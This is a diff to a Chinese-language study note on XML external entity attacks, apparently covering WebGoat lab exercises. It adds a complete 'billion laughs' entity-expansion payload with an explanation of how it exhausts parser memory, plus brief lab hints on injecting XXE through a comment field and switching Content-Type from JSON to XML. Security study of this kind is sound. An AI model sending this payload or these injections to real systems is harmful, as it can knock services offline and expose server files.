@@ -14,6 +14,8 @@
 
   
 
+[XML实体注入学习](jianshu.com/p/a1ea825aa485)
+
 ### 什么是XML实体?
 
 
@@ -55,8 +57,54 @@ XML外部实体攻击是针对解析XML输入的应用程序的一种攻击。�
 
 - Error :尝试在错误消息中获取资源的内
 
+### 现代其他框架
+
+在现代REST框架中，服务器可能能够接受您作为开发人员没有考虑到的数据格式。因此，这可能导致JSON端点容易受到XXE攻击。
+
+
+
+# XXE DOS 攻击
+
+什么是DOS攻击
+
+
+
+ 使用相同的XXE攻击，我们可以对服务器执行DOS服务攻击。这种攻击的一个例子是: 
+
+```xml-dtd
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
+
+当XML解析器加载这个文档时，它会看到它包含一个根元素“lolz”，其中包含文本“&lol9;”。然而，“&lol9”是一个被定义的实体，它扩展成一个包含10个“&lol8”字符串的字符串。每个“&lol8”字符串都是一个已定义的实体，它扩展为10个“&lol7”字符串，依此类推。在处理完所有的实体扩展之后，这一小块(< 1 KB) XML实际上将占用近3 gb的内存。
+
+这被称为“十亿笑”，更多信息可以在这里找到:https://en.wikipedia.org/wiki/billion_laughing
+
 # 解题
 
 * lesson3
 
  在提交表单时，您将在照片中添加一条注释，并尝试执行带有注释字段的XXE注入。试着列出文件系统的根目录。 
+
+![](img/XEE1.png)
+
+* lesson4
+
+  修改content-Type类型json修改为xml
+
+  ![](img/XEE3.png)
+
+  ![](img/XEE2.png)
